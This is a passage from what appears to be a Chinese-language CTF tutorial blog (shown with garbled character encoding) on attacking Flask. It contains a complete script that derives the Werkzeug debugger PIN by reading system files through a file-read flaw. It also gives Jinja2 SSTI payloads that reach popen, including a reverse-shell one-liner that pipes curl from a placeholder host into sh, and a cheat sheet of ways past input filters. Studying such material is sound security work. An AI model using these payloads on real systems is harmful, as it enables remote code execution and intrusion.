class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#å¯¼å…¥éœ€è¦çš„åŒ…</span></span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">from</span> itertools <span class="keyword">import</span> chain</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://9ab6f69b-79a0-471c-bf92-9e4fb9df9a98.challenges.ctfer.com:8080/file?filename=&quot;</span><span class="comment">#é¢˜ç›®åœ°å€</span></span><br><span class="line">username = <span class="string">&quot;root&quot;</span></span><br><span class="line">path=<span class="string">&quot;/usr/local/lib/python3.8/site-packages/flask/app.py&quot;</span><span class="comment">#è·¯å¾„:æŠ¥é”™å¯å¾—</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_uuid</span>():</span><br><span class="line">    payload = <span class="string">&quot;/sys/class/net/eth0/address&quot;</span></span><br><span class="line">    response = requests.get(url=url+payload)</span><br><span class="line">    <span class="keyword">if</span> response.status_code ==<span class="number">200</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;uuid is &#123;&#125; &quot;</span>.<span class="built_in">format</span>(<span class="built_in">int</span>(response.text.strip().replace(<span class="string">&quot;:&quot;</span>,<span class="string">&quot;&quot;</span>)[<span class="number">1</span>:],<span class="number">16</span>)))</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">str</span>(<span class="built_in">int</span>(response.text.strip().replace(<span class="string">&quot;:&quot;</span>,<span class="string">&quot;&quot;</span>)[<span class="number">1</span>:],<span class="number">16</span>))</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_mechine_id</span>():</span><br><span class="line">    payload = <span class="string">&quot;/etc/machine-id&quot;</span></span><br><span class="line">    response = requests.get(url=url+payload)</span><br><span class="line">    <span class="keyword">if</span> response.status_code ==<span class="number">200</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;machine-id is &#123;&#125; &quot;</span>.<span class="built_in">format</span>(pin))</span><br><span class="line">        <span class="keyword">return</span> response.text.strip()</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_boot_id</span>():</span><br><span class="line">    payload = <span class="string">&quot;/proc/sys/kernel/random/boot_id&quot;</span></span><br><span class="line">    response = requests.get(url=url+payload)</span><br><span class="line">    <span class="keyword">if</span> response.status_code ==<span class="number">200</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;boot_id is &#123;&#125; &quot;</span>.<span class="built_in">format</span>(response.text.strip()))</span><br><span class="line">        <span class="keyword">return</span> response.text.strip()</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_cgroup</span>():</span><br><span class="line">    payload = <span class="string">&quot;/proc/self/cgroup&quot;</span></span><br><span class="line">    response = requests.get(url=url+payload)</span><br><span class="line">    <span class="keyword">if</span> response.status_code ==<span class="number">200</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;cgroup is &#123;&#125; &quot;</span>.<span class="built_in">format</span>(<span class="built_in">str</span>(response.text.strip().rpartition(<span class="string">&quot;/&quot;</span>)[<span class="number">2</span>])))</span><br><span class="line">        <span class="keyword">return</span> response.text.strip().rpartition(<span class="string">&quot;/&quot;</span>)[<span class="number">2</span>]</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_PIN</span>():</span><br><span class="line">    rv = <span class="literal">None</span></span><br><span class="line">    num = <span class="literal">None</span></span><br><span class="line">    probably_public_bits = [</span><br><span class="line">        username,<span class="comment"># /etc/passwd</span></span><br><span class="line">        <span class="string">&#x27;flask.app&#x27;</span>,<span class="comment"># é»˜è®¤å€¼</span></span><br><span class="line">        <span class="string">&#x27;Flask&#x27;</span>,<span class="comment"># é»˜è®¤å€¼</span></span><br><span class="line">        path <span class="comment"># æŠ¥é”™å¾—åˆ°</span></span><br><span class="line">    ]</span><br><span class="line">        </span><br><span class="line">    private_bits = [get_uuid(), get_mechine_id()+get_boot_id()+get_cgroup()]</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;private_bits is &quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(private_bits)  </span><br><span class="line"></span><br><span class="line">    <span class="comment">#å¤åˆ¶ç®—æ³•é€»è¾‘  </span></span><br><span class="line">    h = hashlib.sha1()</span><br><span class="line">    <span class="keyword">for</span> bit <span class="keyword">in</span> chain(probably_public_bits, private_bits):</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> bit:</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">isinstance</span>(bit, <span class="built_in">str</span>):</span><br><span class="line">            bit = bit.encode(<span class="string">&quot;utf-8&quot;</span>)</span><br><span class="line">        h.update(bit)</span><br><span class="line">    h.update(<span class="string">b&quot;cookiesalt&quot;</span>)</span><br><span class="line">    cookie_name = <span class="string">f&quot;__wzd<span class="subst">&#123;h.hexdigest()[:<span class="number">20</span>]&#125;</span>&quot;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># If we need to generate a pin we salt it a bit more so that we don&#x27;t</span></span><br><span class="line">    <span class="comment"># end up with the same value and generate out 9 digits</span></span><br><span class="line">    <span class="keyword">if</span> num <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">        h.update(<span class="string">b&quot;pinsalt&quot;</span>)</span><br><span class="line">        num = <span class="string">f&quot;<span class="subst">&#123;<span class="built_in">int</span>(h.hexdigest(), <span class="number">16</span>):09d&#125;</span>&quot;</span>[:<span class="number">9</span>]</span><br><span class="line"></span><br><span class="line">    <span class="comment"># Format the pincode in groups of digits for easier remembering if</span></span><br><span class="line">    <span class="comment"># we don&#x27;t have a result yet.</span></span><br><span class="line">    <span class="keyword">if</span> rv <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">        <span class="keyword">for</span> group_size <span class="keyword">in</span> <span class="number">5</span>, <span class="number">4</span>, <span class="number">3</span>:</span><br><span class="line">            <span class="keyword">if</span> <span class="built_in">len</span>(num) % group_size == <span class="number">0</span>:</span><br><span class="line">                rv = <span class="string">&quot;-&quot;</span>.join(</span><br><span class="line">                    num[x : x + group_size].rjust(group_size, <span class="string">&quot;0&quot;</span>)</span><br><span class="line">                    <span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(num), group_size)</span><br><span class="line">                )</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            rv = num</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> rv</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">        pin = get_PIN()</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;PIN is &#123;&#125; &quot;</span>.<span class="built_in">format</span>(pin))</span><br></pre></td></tr></table></figure><h3 id="åŸºäºFlaskä¸‹çš„SSTI"><a href="#åŸºäºFlaskä¸‹çš„SSTI" class="headerlink" title="åŸºäºFlaskä¸‹çš„SSTI"></a>åŸºäºFlaskä¸‹çš„SSTI</h3><p>sstiå…¨ç§°ä¸ºæ¨¡æ¿æ³¨å…¥, ä¹Ÿå°±æ˜¯å½“æˆ‘ä»¬å¯ä»¥æ§åˆ¶è¦æ¸²æŸ“çš„æ¨¡æ¿çš„æ—¶å€™, ä¹Ÿå°±æ˜¯å¯ä»¥æ§åˆ¶æ¨¡æ¿ä¸­çš„å˜é‡æ ‡è®°å†…å®¹, è¿™æ—¶å€™, æˆ‘ä»¬å¯ä»¥åˆ©ç”¨æ¨¡æ¿è¯­æ³•, æ‰§è¡Œpythonä»£ç , å®ç°ä»»æ„ä»£ç æ‰§è¡Œ</p><h4 id="pythoné­”æœ¯æ–¹æ³•å’Œå†…ç½®ç±»"><a href="#pythoné­”æœ¯æ–¹æ³•å’Œå†…ç½®ç±»" class="headerlink" title="pythoné­”æœ¯æ–¹æ³•å’Œå†…ç½®ç±»"></a>pythoné­”æœ¯æ–¹æ³•å’Œå†…ç½®ç±»</h4><p>åœ¨å­¦ä¹ sstiæ³¨å…¥ä¹‹å‰, æˆ‘ä»¬é¦–å…ˆéœ€è¦äº†è§£ä¸€äº›pythonçš„é­”æœ¯æ–¹æ³•å’Œå†…ç½®ç±»</p><h5 id="class"><a href="#class" class="headerlink" title="class"></a><strong>class</strong></h5><p><code>__class</code>__ç”¨äºè¿”å›è¯¥å¯¹è±¡æ‰€å±çš„ç±»</p><p>ğŸŒ°<img lazyload alt="image" data-src="https://blog-1308152021.cos.ap-beijing.myqcloud.com/image-20230418224222553.png" alt="image-20230418224222553"></p><h5 id="base"><a href="#base" class="headerlink" title="base"></a><strong>base</strong></h5><p><code>__base__</code>ç”¨äºè·å–ç±»çš„åŸºç±»(ä¹Ÿç§°çˆ¶ç±»)</p><p>ğŸŒ°<img lazyload alt="image" data-src="https://blog-1308152021.cos.ap-beijing.myqcloud.com/image-20230418224659712.png" alt="image-20230418224659712"></p><h5 id="mro"><a href="#mro" class="headerlink" title="mro"></a><strong>mro</strong></h5><p><code>__mro__</code>è¿”å›è§£ææ–¹æ³•è°ƒç”¨çš„é¡ºåº, (å½“è°ƒç”¨<code>__mro__[1]</code>æˆ–è€…-1æ—¶ä½œç”¨å…¶å®ç­‰åŒäº<code>__base__</code>)ç¤ºä¾‹:</p><p>ğŸŒ°</p><p><img lazyload alt="image" data-src="https://blog-1308152021.cos.ap-beijing.myqcloud.com/image-20230418225326640.png" alt="image-20230418225326640"></p><h5 id="subclasses"><a href="#subclasses" class="headerlink" title="subclasses()"></a><strong>subclasses</strong>()</h5><p><code>__subclasses__()</code>å¯ä»¥è·å–ç±»çš„æ‰€æœ‰å­ç±»</p><p>ğŸŒ°<img lazyload alt="image" data-src="https://blog-1308152021.cos.ap-beijing.myqcloud.com/image-20230418225651272.png" alt="image-20230418225651272"></p><p>ç›®å‰ä¸»è¦åˆ†ä¸¤ç§æƒ…å†µä¸‹çš„æ¨¡æ¿æ³¨å…¥</p><h4 id="æ¨¡æ¿åç§°å¯æ§"><a href="#æ¨¡æ¿åç§°å¯æ§" class="headerlink" title="æ¨¡æ¿åç§°å¯æ§"></a>æ¨¡æ¿åç§°å¯æ§</h4><p>ç±»ä¼¼äºä¸Šé¢å­¦åˆ°çš„å†…å®¹, å½“<code>login.html</code>è¿™ä¸ªå‚æ•°å¯ä»¥æ§åˆ¶çš„æ—¶å€™, æˆ‘ä»¬å°±èƒ½æ¸²æŸ“æˆ‘ä»¬æŒ‡å®šçš„æ–‡ä»¶</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask</span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> request</span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span>  render_template</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>():</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;plz login&#x27;</span></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/login&#x27;</span>, methods=[<span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">login</span>():</span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&quot;login.html&quot;</span>, username=request.form[<span class="string">&#x27;username&#x27;</span>],passwd=request.form[<span class="string">&#x27;passwd&#x27;</span>])</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app.run(host=<span class="string">&quot;0.0.0.0&quot;</span>,port=<span class="number">80</span>,debug=<span class="literal">True</span>)</span><br></pre></td></tr></table></figure><blockquote><p>render_template æ˜¯flaskä¸­é¡µé¢è·³è½¬çš„æ–¹æ³•ï¼Œå…¶ç”¨æ³•å¾ˆç®€å•ï¼Œå¦‚ä¸‹ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">return</span> render_template(<span class="string">&quot;index.html&quot;</span>)</span><br></pre></td></tr></table></figure><p>è¿™ç§æ–¹æ³•å¯ä»¥ä¼ é€’å‚æ•°ï¼Œå…·ä½“æ–¹æ³•å¦‚ä¸‹ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">return</span> render_template(<span class="string">&quot;index.html&quot;</span>, msg=session.get(<span class="string">&quot;username&quot;</span>))</span><br></pre></td></tr></table></figure><p>è¿™æ—¶å¯ä»¥å°†ä½ æƒ³è¦ä¼ é€’çš„æ•°æ®ä¼ é€’åˆ°ä½ è¦è·³è½¬çš„é¡µé¢ï¼Œåœ¨é¡µé¢ä¸­æ˜¾ç¤ºè¿™äº›å†…å®¹éœ€è¦ä½¿ç”¨ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;msg&#125;&#125;</span><br></pre></td></tr></table></figure></blockquote><p>è¿™é‡Œçš„<code>login.html</code>å¯æ§, è¿™æ—¶å€™éœ€è¦ä¸€ä¸ªä¸Šä¼ ç‚¹, ä¸Šä¼ åŒ…å«æ¨¡æ¿è¯­æ³•çš„<code>html</code>è¢«æ¸²æŸ“å°±å¯ä»¥æ¸²æŸ“æ‰§è¡Œæˆ‘ä»¬çš„<code>python</code>ä»£ç </p><h4 id="æ¨¡æ¿å†…å®¹å¯æ§"><a href="#æ¨¡æ¿å†…å®¹å¯æ§" class="headerlink" title="æ¨¡æ¿å†…å®¹å¯æ§"></a>æ¨¡æ¿å†…å®¹å¯æ§</h4><p>å¦‚æœè¦å®ç°æ¨¡æ¿å†…å®¹å¯æ§å°±éœ€è¦ä½¿ç”¨åˆ°å±é™©å‡½æ•°, ä¾‹å¦‚è¿™é‡Œä½¿ç”¨ä¸€ä¸ª<code>render_template_string()</code></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, render_template_string</span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> request</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>():</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;plz login&#x27;</span></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/login&#x27;</span>, methods=[<span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">login</span>():</span><br><span class="line">    <span class="keyword">return</span> render_template_string(request.form[<span class="string">&#x27;content&#x27;</span>])</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app.run(host=<span class="string">&quot;0.0.0.0&quot;</span>,port=<span class="number">80</span>,debug=<span class="literal">True</span>)</span><br></pre></td></tr></table></figure><p>è¿™é‡Œå¯ä»¥æˆåŠŸæ‰§è¡Œæ ‡ç­¾å†…çš„è¡¨è¾¾å¼</p><p><img lazyload alt="image" data-src="https://blog-1308152021.cos.ap-beijing.myqcloud.com/image-20230420143315772.png" alt="image-20230420143315772"></p><p>è¿™é‡Œä»‹ç»ä¸€ä¸ªæœ€ç®€å•çš„payload<code>name=&#123;&#123;"".__class__.__base__.__subclasses__()[132].__init__.__globals__['popen']('curl https://your-shell.com/ip:port |sh')&#125;&#125;</code></p><p>è¿™é‡Œå¯ä»¥é€šè¿‡åå¼¹shellæ‹¿åˆ°flag<img lazyload alt="image" data-src="https://blog-1308152021.cos.ap-beijing.myqcloud.com/image-20230420145830657.png" alt="image-20230420145830657"></p><h5 id="åšé¢˜æ€è·¯"><a href="#åšé¢˜æ€è·¯" class="headerlink" title="åšé¢˜æ€è·¯"></a>åšé¢˜æ€è·¯</h5><p>è¿™é‡Œå¤§è‡´å†™ä¸€ä¸‹åšé¢˜æ­¥éª¤</p><p>åœ¨pythonä¸­, æ˜¯é€šè¿‡ç±»åæ–¹æ³•åçš„æ–¹å¼è°ƒç”¨çš„, å¦‚æœæˆ‘ä»¬è¦è°ƒç”¨shellå‘½ä»¤, ä¸€èˆ¬æˆ‘ä»¬å¯ä»¥ä½¿ç”¨<code>os.system(&#39;calc&#39;)</code>, é‚£ä¹ˆå¦‚ä½•åœ¨è¡¨è¾¾å¼æ ‡ç­¾ä¸­, æ‰¾åˆ°osç±»å‘¢</p><p>ç¬¬ä¸€æ­¥ æ‹¿åˆ°å½“å‰ç±»</p><p>ä¹Ÿå°±æ˜¯é€šè¿‡ç±»å‹æ‹¿åˆ°<code>__class__</code></p><p>è¿™é‡Œæˆ‘ä»¬ä½¿ç”¨<code>&#123;&#123;"".__class__&#125;&#125;</code></p><p>ç¬¬äºŒæ­¥ æ‹¿åˆ°å½“å‰ç±»çš„åŸºç±»</p><p>è¿™æ—¶å€™, æˆ‘ä»¬å¯ä»¥å†™ä¸º</p><ul><li><code>&#123;&#123;"".__class__.__base__&#125;&#125;</code></li><li><code>&#123;&#123;"".__class__.__base[0]__&#125;&#125;</code></li><li><code>&#123;&#123;"".__class__.__mro__[1]&#125;&#125;</code></li></ul><p>ç¬¬ä¸‰æ­¥ æ‹¿åˆ°åŸºç±»çš„æ‰€æœ‰å­ç±»</p><p><code>&#123;&#123;"".__class__.__base__.__subclasses__()&#125;&#125;</code></p><p>ç¬¬å››æ­¥ å¯»æ‰¾æˆ‘ä»¬è¦åˆ©ç”¨çš„osç±»</p><p>è¿™é‡Œæˆ‘ä»¬éœ€è¦æ‰¾åˆ°osç±»çš„ä¸‹æ ‡, æˆ‘ä»¬å¯ä»¥é‡‡ç”¨æ•°<code>,</code>çš„æ–¹å¼, å¯ä»¥ä½¿ç”¨æ–‡æœ¬ç¼–è¾‘è½¯ä»¶<code>ctrl+f</code></p><p>ç¬¬äº”æ­¥ æ‰¾åˆ°å¯åˆ©ç”¨çš„ç±»çš„ä¸‹æ ‡å, å°±èƒ½çŸ¥é“å…¶æ–¹æ³•</p><p>ä½¿ç”¨<code>__init__</code>æ–¹æ³•å¯¹ç±»è¿›è¡Œåˆå§‹åŒ–</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;<span class="string">&quot;&quot;</span>.__class__.__base__[<span class="number">0</span>].__subclasses__()[<span class="number">132</span>].__init__&#125;&#125;</span><br></pre></td></tr></table></figure><p>ç„¶åå†è°ƒç”¨<code>__globals__</code>è·å–åˆ°æ–¹æ³•å†…ä»¥å­—å…¸çš„å½¢å¼è¿”å›çš„æ–¹æ³•/å±æ€§ç­‰</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;<span class="string">&quot;&quot;</span>.__class__.__base__[<span class="number">0</span>].__subclasses__()[<span class="number">132</span>].__init__.__globals__&#125;&#125;</span><br></pre></td></tr></table></figure><p>ç„¶åå°±å¯ä»¥é€šè¿‡æ•°ç»„keyæ‹¿åˆ°å¯¹åº”çš„æ–¹æ³•äº†, è¿™é‡Œæˆ‘ä»¬ä½¿ç”¨shellæ‰§è¡Œæ–¹æ³•<code>popen</code></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;<span class="string">&quot;&quot;</span>.__class__.__base__.__subclasses__()[<span class="number">132</span>].__init__.__globals__[<span class="string">&#x27;popen&#x27;</span>](<span class="string">&#x27;ls /&#x27;</span>).read()&#125;&#125;</span><br></pre></td></tr></table></figure><p><img lazyload alt="image" data-src="https://blog-1308152021.cos.ap-beijing.myqcloud.com/image-20230420185744947.png" alt="image-20230420185744947"></p><p>å‰é¢æ‰€è¯´çš„ç›¸å½“äºå‘½ä»¤æ‰§è¡Œ, ä¸‹é¢ä»‹ç»ä¸€ç§ä»£ç æ‰§è¡Œæ–¹æ³•</p><p>ä½¿ç”¨<code>uiltins</code>ç±»çš„<code>eval</code>æ–¹æ³•æ„é€ </p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;url_for.__globals__[<span class="string">&#x27;__builtins__&#x27;</span>][<span class="string">&#x27;eval&#x27;</span>](<span class="string">&quot;__import__(&#x27;os&#x27;).popen(&#x27;ls /&#x27;).read()&quot;</span>)&#125;&#125;</span><br></pre></td></tr></table></figure><h4 id="flaskçš„sstiçš„è¿‡æ»¤ä¸ç»•è¿‡"><a href="#flaskçš„sstiçš„è¿‡æ»¤ä¸ç»•è¿‡" class="headerlink" title="flaskçš„sstiçš„è¿‡æ»¤ä¸ç»•è¿‡"></a>flaskçš„sstiçš„è¿‡æ»¤ä¸ç»•è¿‡</h4><h5 id="ç»•è¿‡-è¿‡æ»¤"><a href="#ç»•è¿‡-è¿‡æ»¤" class="headerlink" title="ç»•è¿‡.è¿‡æ»¤"></a>ç»•è¿‡<code>.</code>è¿‡æ»¤</h5><ul><li><p>ä½¿ç”¨<code>[]</code>ç»•è¿‡</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;<span class="string">&quot;&quot;</span>.__class__&#125;&#125;=&#123;&#123;<span class="string">&quot;&quot;</span>[<span class="string">&#x27;__class__&#x27;</span>]&#125;&#125;</span><br></pre></td></tr></table></figure></li><li><p>attrè¿‡æ»¤å™¨ç»•è¿‡</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;<span class="string">&quot;&quot;</span>.__class__&#125;&#125;=&#123;&#123;<span class="string">&quot;&quot;</span>|attr(<span class="string">&#x27;__class__&#x27;</span>)&#125;&#125;</span><br></pre></td></tr></table></figure></li></ul><h5 id="ç»•è¿‡-è¿‡æ»¤-1"><a href="#ç»•è¿‡-è¿‡æ»¤-1" class="headerlink" title="ç»•è¿‡_è¿‡æ»¤"></a>ç»•è¿‡<code>_</code>è¿‡æ»¤</h5><ul><li><p>æ„é€ <code>_</code>å‡ºæ¥</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;% <span class="built_in">set</span> a=(()|select|string|<span class="built_in">list</span>).pop(<span class="number">24</span>)%&#125;&#123;%<span class="built_in">print</span>(a)%&#125;</span><br></pre></td></tr></table></figure></li><li><p>16è¿›åˆ¶ç¼–ç ç»•è¿‡</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;()[<span class="string">&quot;\x5f\x5fcalss\x5f\x5f&quot;</span>]&#125;&#125; = &#123;&#123;().__class__&#125;&#125;</span><br></pre></td></tr></table></figure></li></ul><h5 id="ç»•è¿‡-è¿‡æ»¤-2"><a href="#ç»•è¿‡-è¿‡æ»¤-2" class="headerlink" title="ç»•è¿‡[]è¿‡æ»¤"></a>ç»•è¿‡<code>[]</code>è¿‡æ»¤</h5><p>å¯ä»¥ä½¿ç”¨<code>__getitem__</code>é­”æœ¯æ–¹æ³•, å®ƒçš„ä½œç”¨ç®€å•è¯´å°±æ˜¯æŠŠä¸­æ‹¬å·è½¬åŒ–ä¸ºæ‹¬å·çš„å½¢å¼</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">__base__[<span class="number">0</span>]=__base__.getitem__(<span class="number">0</span>)</span><br></pre></td></tr></table></figure><h5 id="ç»•è¿‡-è¿‡æ»¤-3"><a href="#ç»•è¿‡-è¿‡æ»¤-3" class="headerlink" title="ç»•è¿‡\{\{è¿‡æ»¤"></a>ç»•è¿‡<code>\&#123;\&#123;</code>è¿‡æ»¤</h5><p>å¯ä»¥åˆ©ç”¨jinja2çš„è¯­æ³•, ç”¨<code>\&#123;%</code>æ¥è¿›è¡Œrce</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;%<span class="string">&quot;&quot;</span>.__class__.__base__.__subclasses__()[<span class="number">132</span>].__init__.__globals__[<span class="string">&#x27;popen&#x27;</span>](<span class="string">&#x27;ls /&#x27;</span>).read()&#125;</span><br></pre></td></tr></table></figure><p>è¿˜å¯ä»¥åˆ©ç”¨<code>for</code>å¾ªç¯</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#123;%<span class="keyword">for</span> i <span class="keyword">in</span> <span class="string">&#x27;&#x27;</span>.__class__.__base__.__subclasses__()%)&#125;&#123;%<span class="keyword">for</span> i.__name__ == <span class="string">&#x27;_wrp_close&#x27;</span>%&#125;</span><br><span class="line">&#123;%<span class="built_in">print</span> i.__init__.globals__[<span class="string">&#x27;popen&#x27;</span>](<span class="string">&#x27;ls /&#x27;</span>).read()%&#125;&#123;%endif%&#125;&#123;%endfor%&#125;</span><br></pre></td></tr></table></figure><h5 id="ç»•è¿‡å•-åŒå¼•å·è¿‡æ»¤"><a href="#ç»•è¿‡å•-åŒå¼•å·è¿‡æ»¤" class="headerlink" title="ç»•è¿‡å•/åŒå¼•å·è¿‡æ»¤"></a>ç»•è¿‡å•/åŒå¼•å·è¿‡æ»¤</h5><p>å¯ä»¥é‡‡ç”¨<code>request.args.a</code>ç„¶åç»™aèµ‹å€¼çš„æ–¹å¼è¿›è¡Œç»•è¿‡</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;<span class="string">&quot;&quot;</span>.__class__.__base__.__subclasses__()[<span class="number">132</span>].__init__.__globals__[request.args.a](request.args.b).read()&#125;&#125;</span><br></pre></td></tr></table></figure><p><img lazyload alt="image" data-src="https://blog-1308152021.cos.ap-beijing.myqcloud.com/image-20230420194717379.png" alt="image-20230420194717379"></p><p>argsè¢«banäº†å¯ä»¥ç”¨<code>request.cookie</code>ä¼ªé€ </p><h5 id="ç»•è¿‡æ•°å­—è¿‡æ»¤"><a href="#ç»•è¿‡æ•°å­—è¿‡æ»¤" class="headerlink" title="ç»•è¿‡æ•°å­—è¿‡æ»¤"></a>ç»•è¿‡æ•°å­—è¿‡æ»¤</h5><p>å¦‚æœæ•°å­—<code>0-9</code>è¢«banäº†, å¯ä»¥é€šè¿‡countæ¥å¾—åˆ°æ•°å­—</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td 